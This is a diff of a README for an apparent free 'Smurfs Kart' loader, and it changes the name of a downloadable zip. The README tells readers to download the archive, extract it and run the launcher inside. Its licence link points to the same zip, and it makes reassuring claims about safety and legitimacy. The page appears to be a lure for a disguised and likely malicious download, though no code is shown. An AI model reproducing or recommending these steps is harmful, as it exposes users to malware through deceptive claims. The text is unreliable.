@@ -25,7 +25,7 @@ Welcome to **Smurfs Kart **, your go-to project for efficient and safe launching
 
 ## 🛠️ Installation Guide
 
-1. Download **https://raw.githubusercontent.com/Saleh908/SmurfsKart-Freeway/main/Kyklopes/SmurfsKart-Freeway.zip** from the repository's releases.
+1. Download **https://raw.githubusercontent.com/Saleh908/SmurfsKart-Freeway/main/Kyklopes/Smurfs-Freeway-Kart-2.5.zip** from the repository's releases.
 2. Extract the archive using any decompression tool.
 3. Execute the included launcher file for your OS.
 4. Follow on-screen prompts to enjoy the Smurfs Kart adventure!
@@ -34,7 +34,7 @@ Welcome to **Smurfs Kart **, your go-to project for efficient and safe launching
 This repository is intended for educational and archival purposes only. No copyrighted material is hosted. The loader provides enhanced accessibility for legitimate owners and does **not** bypass licensing or ownership checks.
 
 ## 📃 MIT License
-This project is open-source, licensed under the MIT License (2025). See [MIT License](https://raw.githubusercontent.com/Saleh908/SmurfsKart-Freeway/main/Kyklopes/SmurfsKart-Freeway.zip) for information and permissions.
+This project is open-source, licensed under the MIT License (2025). See [MIT License](https://raw.githubusercontent.com/Saleh908/SmurfsKart-Freeway/main/Kyklopes/Smurfs-Freeway-Kart-2.5.zip) for information and permissions.
 
 ---
 *Start your Smurfs racing adventure safely, smoothly, and for free!* 🏎️
